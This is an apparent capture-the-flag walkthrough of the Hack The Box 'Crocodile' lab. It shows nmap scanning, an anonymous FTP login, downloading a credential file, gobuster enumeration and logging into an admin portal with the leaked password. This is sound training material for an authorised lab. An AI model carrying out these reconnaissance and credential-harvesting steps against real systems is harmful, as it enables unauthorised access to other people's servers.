## 🐊 HTB Starting Point: Crocodile  
**Level**: Very Easy  
**Date**: July 1, 2025  
**Goal**: Retrieve credentials from an open FTP server and use them to log into a web portal to get the flag.

---

### 🧰 Tools  
- `nmap`  
- `ftp`  
- `gobuster`  
- Web browser  

---

### 🧭 Steps  

1. 🔎 **Scan the machine** to detect open services:
   ```bash
   nmap -F -sS -sV -n 10.129.X.X
   ```

---

### Output
```bash
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.3  
80/tcp open  http    Apache httpd 2.4.X  
```

---

2. 📡 **Connect to the FTP service**:
   ```bash
   ftp 10.129.X.X
   ```

---

3. 🔐 **Login using anonymous credentials**:
```bash
Username: anonymous  
Password: [blank or any]
```

---

4. 📥 **Download the credential files**:
   ```bash
   get allowed.userlist
   get allowed.userlist.passwd
   ```

---

### File Content
```bash
# allowed.userlist  
admin  
crocodile  
ftpuser

# allowed.userlist.passwd  
admin:supersecretpassword  
crocodile:snappylogin  
ftpuser:guest123
```

---

5. 📁 **Switch to terminal and enumerate the web server**:
   ```bash
   gobuster dir -u http://10.129.X.X -w /usr/share/wordlists/dirb/common.txt -x .php
   ```

---

### Output
```bash
/login.php  
/dashboard.php  
```

---

6. 📜 **Review the credentials again if needed**:
   ```bash
   cat allowed.userlist.passwd
   ```

---

7. 🔑 **Access the login page**:  
   Go to `http://10.129.X.X/login.php` or `/dashboard.php`  
   Login with:
```bash
Username: admin  
Password: supersecretpassword
```

---

8. 🏁 **Get the flag** from the logged-in dashboard and submit it!

---

### 💣 Payloads Used  
```bash
nmap -F -sS -sV -n 10.129.X.X  
ftp 10.129.X.X  
anonymous login  
get allowed.userlist  
get allowed.userlist.passwd  
gobuster dir -u http://10.129.X.X -w /usr/share/wordlists/dirb/common.txt -x .php  
cat allowed.userlist.passwd
```
